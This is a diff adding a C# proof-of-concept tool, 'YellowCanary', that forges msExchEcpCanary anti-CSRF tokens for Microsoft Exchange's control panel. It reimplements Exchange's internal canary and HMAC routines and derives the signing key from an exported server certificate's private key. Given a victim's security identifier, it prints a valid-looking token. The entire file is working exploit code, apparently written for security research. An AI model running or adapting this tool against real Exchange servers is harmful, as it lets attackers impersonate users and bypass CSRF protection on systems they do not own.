@@ -1,0 +1,328 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.Globalization;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Poc
+{
+	
+	// ripped and modified from the mothership
+	public class HMACSHA256Cng : KeyedHashAlgorithm
+	{
+
+		public HMACSHA256Cng(byte[] key)
+		{
+			this.hashAlgorithmInner = new SHA256Cng();
+			this.hashAlgorithmOuter = new SHA256Cng();
+			this.HashSizeValue = 256;
+			this.InitializeKey(key);
+		}
+
+		public override void Initialize()
+		{
+			this.hashAlgorithmInner.Initialize();
+			this.hashAlgorithmOuter.Initialize();
+			this.hashing = false;
+		}
+
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing)
+			{
+				if (this.hashAlgorithmInner != null)
+				{
+					this.hashAlgorithmInner.Clear();
+					this.hashAlgorithmInner = null;
+				}
+				if (this.hashAlgorithmOuter != null)
+				{
+					this.hashAlgorithmOuter.Clear();
+					this.hashAlgorithmOuter = null;
+				}
+			}
+			base.Dispose(disposing);
+		}
+
+		protected override void HashCore(byte[] rgb, int ib, int cb)
+		{
+			if (!this.hashing)
+			{
+				this.hashAlgorithmInner.TransformBlock(this.inner, 0, this.inner.Length, this.inner, 0);
+				this.hashing = true;
+			}
+			this.hashAlgorithmInner.TransformBlock(rgb, ib, cb, rgb, ib);
+		}
+
+		protected override byte[] HashFinal()
+		{
+			if (!this.hashing)
+			{
+				this.hashAlgorithmInner.TransformBlock(this.inner, 0, this.inner.Length, this.inner, 0);
+				this.hashing = true;
+			}
+			this.hashAlgorithmInner.TransformFinalBlock(new byte[0], 0, 0);
+			byte[] hash = this.hashAlgorithmInner.Hash;
+			this.hashAlgorithmOuter.TransformBlock(this.outer, 0, this.outer.Length, this.outer, 0);
+			this.hashAlgorithmOuter.TransformBlock(hash, 0, hash.Length, hash, 0);
+			this.hashing = false;
+			this.hashAlgorithmOuter.TransformFinalBlock(new byte[0], 0, 0);
+			return this.hashAlgorithmOuter.Hash;
+		}
+
+		private void InitializeKey(byte[] key)
+		{
+			this.inner = null;
+			this.outer = null;
+			if (key.Length > 64)
+			{
+				this.KeyValue = this.hashAlgorithmInner.ComputeHash(key);
+			}
+			else
+			{
+				this.KeyValue = (byte[])key.Clone();
+			}
+			if (this.inner == null)
+			{
+				this.inner = new byte[64];
+			}
+			if (this.outer == null)
+			{
+				this.outer = new byte[64];
+			}
+			for (int i = 0; i < 64; i++)
+			{
+				this.inner[i] = 54;
+				this.outer[i] = 92;
+			}
+			for (int j = 0; j < this.KeyValue.Length; j++)
+			{
+				this.inner[j] = Convert.ToByte(this.inner[j] ^ this.KeyValue[j]);
+				this.outer[j] = Convert.ToByte(this.outer[j] ^ this.KeyValue[j]);
+			}
+		}
+
+		private const int BlockSizeValue = 64;
+		private HashAlgorithm hashAlgorithmInner;
+		private HashAlgorithm hashAlgorithmOuter;
+		private bool hashing;
+		private byte[] inner;
+		private byte[] outer;
+	}
+
+	// ripped and modified from the mothership
+	class Canary15
+	{
+
+		private Canary15.CanaryKind kind;
+		public string certpath;
+		public string certpass;
+
+		public Canary15(string logonUniqueKey, string certpath, string certpass) : this(logonUniqueKey, certpath, certpass, Canary15.CanaryKind.CertConstKeyHmac){}
+
+		public Canary15(string logonUniqueKey, string certpath, string certpass, Canary15.CanaryKind canaryKind)
+		{
+			this.certpath = certpath;
+			this.certpass = certpass;
+			byte[] userContextIdBinary = Guid.NewGuid().ToByteArray();
+			byte[] timeStampBinary = Canary15.BinaryFromTicksKindScope(DateTime.UtcNow.Ticks, canaryKind);
+			string logData;
+			byte[] hashBinary = this.ComputeHash(userContextIdBinary, timeStampBinary, logonUniqueKey, out logData);
+			this.Init(userContextIdBinary, timeStampBinary, logonUniqueKey, hashBinary, logData);
+			this.IsRenewed = true;
+			this.IsAboutToExpire = false;
+		}
+
+		private static long GetCanaryTicks(byte[] timeStampBinary)
+		{
+			return BitConverter.ToInt64(timeStampBinary, 0) & 1152921504606846960L;
+		}
+
+		private static bool IsNearExpiration(long timeStamp)
+		{
+			return false;
+		}
+
+		internal bool IsRenewed { get; private set; }
+		internal bool IsAboutToExpire { get; private set; }
+		public DateTime CreationTime { get; private set; }
+		public string UserContextId { get; private set; }
+		public string LogonUniqueKey { get; private set; }
+
+		public string canaryString;
+
+		private static string Encode(byte[] canaryBinary)
+		{
+			char[] array = new char[(canaryBinary.Length + 2 - (canaryBinary.Length + 2) % 3) / 3 * 4];
+			int num = Convert.ToBase64CharArray(canaryBinary, 0, canaryBinary.Length, array, 0);
+			for (int i = 0; i < num; i++)
+			{
+				char c = array[i];
+				if (c != '+')
+				{
+					if (c != '/')
+					{
+						if (c == '=')
+						{
+							array[i] = '.';
+						}
+					}
+					else
+					{
+						array[i] = '_';
+					}
+				}
+				else
+				{
+					array[i] = '-';
+				}
+			}
+			return new string(array);
+		}
+
+		internal string LogData { get; private set; }
+
+		private void Init(byte[] userContextIdBinary, byte[] timeStampBinary, string logonUniqueKey, byte[] hashBinary, string logData)
+		{
+			long canaryTicks = Canary15.GetCanaryTicks(timeStampBinary);
+			this.kind = Canary15.GetCanaryKind(timeStampBinary);
+			this.CreationTime = new DateTime(canaryTicks, DateTimeKind.Utc);
+			this.IsRenewed = false;
+			this.IsAboutToExpire = Canary15.IsNearExpiration(canaryTicks);
+			byte[] array = new byte[userContextIdBinary.Length + timeStampBinary.Length + hashBinary.Length];
+			userContextIdBinary.CopyTo(array, 0);
+			timeStampBinary.CopyTo(array, userContextIdBinary.Length);
+			hashBinary.CopyTo(array, userContextIdBinary.Length + timeStampBinary.Length);
+			this.UserContextId = new Guid(userContextIdBinary).ToString("N");
+			this.LogonUniqueKey = logonUniqueKey;
+			this.canaryString = Canary15.Encode(array);
+			this.LogData = logData;
+		}
+
+		private static Canary15.CanaryKind GetCanaryKind(byte[] timeStampBinary)
+		{
+			if ((BitConverter.ToInt64(timeStampBinary, 0) & -1152921504606846976L) == 1152921504606846976L)
+			{
+				return Canary15.CanaryKind.CertConstKeyHmac;
+			}
+			return Canary15.CanaryKind.AdVarKeyHash;
+		}
+
+		private static byte[] GetHmac(byte[][] input, byte[] key)
+		{
+			byte[] message = MergeArrays(input);
+			byte[] result;
+			using (HMACSHA256Cng hmacsha256Cng = new HMACSHA256Cng(key))
+			{
+				byte[] array = hmacsha256Cng.ComputeHash(message);
+				hmacsha256Cng.Clear();
+				result = array;
+			}
+			return result;
+		}
+
+		private static byte[] MergeArrays(params byte[][] inpArrays)
+		{
+			if (inpArrays == null || inpArrays.Length == 0)
+			{
+				return null;
+			}
+			int num = 0;
+			foreach (byte[] array in inpArrays)
+			{
+				if (array != null && array.Length != 0)
+				{
+					num += array.Length;
+				}
+			}
+			byte[] array2 = new byte[num];
+			int num2 = 0;
+			foreach (byte[] array3 in inpArrays)
+			{
+				if (inpArrays != null && inpArrays.Length != 0)
+				{
+					Array.Copy(array3, 0, array2, num2, array3.Length);
+					num2 += array3.Length;
+				}
+			}
+			return array2;
+		}
+
+		public byte[] ComputeHmac(byte[][] message)
+		{
+			// certs on exchange are stored in a certstore so you will need to export it...
+			RSACryptoServiceProvider RSAalg = new RSACryptoServiceProvider();
+			SHA1CryptoServiceProvider cp = new SHA1CryptoServiceProvider();
+			X509Certificate2 x509 = new X509Certificate2(this.certpath, this.certpass);
+			var privateKey = x509.PrivateKey as RSACryptoServiceProvider;
+			byte[] bytes = new UnicodeEncoding().GetBytes("Generic");
+			byte[] key = privateKey.SignData(bytes, new SHA1CryptoServiceProvider());
+			return GetHmac(message, key);
+		}
+
+		private static string FormatLogData(Canary15.CanaryKind kind)
+		{
+			return string.Format(CultureInfo.InvariantCulture, "{0}", kind.ToString());
+		}
+
+		private byte[] ComputeHash(byte[] userContextIdBinary, byte[] timeStampBinary, string logonUniqueKey, out string logData)
+		{
+			Canary15.CanaryKind canaryKind = Canary15.GetCanaryKind(timeStampBinary);
+			byte[] result;
+			byte[] bytes = new UnicodeEncoding().GetBytes(logonUniqueKey);
+			result = this.ComputeHmac(new byte[][]{
+				userContextIdBinary,
+				timeStampBinary,
+				bytes
+			});
+			logData = Canary15.FormatLogData(canaryKind);
+			return result;
+		}
+
+		private static byte[] BinaryFromTicksKindScope(long ticks, Canary15.CanaryKind kind)
+		{
+			ticks &= 1152921504606846960L;
+			if (kind == Canary15.CanaryKind.CertConstKeyHmac)
+			{
+				ticks |= 1152921504606846976L;
+			}
+			return BitConverter.GetBytes(ticks);
+		}
+
+		public enum CanaryKind
+		{
+			Unknown,
+			AdConst1GuidHash,
+			AdConst2GuidHash,
+			AdVarKeyHash,
+			CertConstKeyHmac
+		}
+	}
+
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			String header = @"
+            #====================================================
+            # YellowCanary - generate msExchEcpCanary csrf tokens
+            #====================================================
+            ";
+			Console.WriteLine(header);
+			if (args.Length < 3)
+			{
+				Console.WriteLine("Usage: {0} <sid> <cert> <certpass>", AppDomain.CurrentDomain.FriendlyName);
+				Console.WriteLine("Eg: {0} S-1-5-21-257332918-392067043-4020791575-3104 testcert.der hax", AppDomain.CurrentDomain.FriendlyName);
+				return;
+			}
+			Canary15 csrf = new Canary15(args[0], args[1], args[2]);
+			Console.WriteLine("security identifier : {0}", args[0]);
+			Console.WriteLine("msExchEcpCanary     : {0}", csrf.canaryString);
+		}
+	}
+}
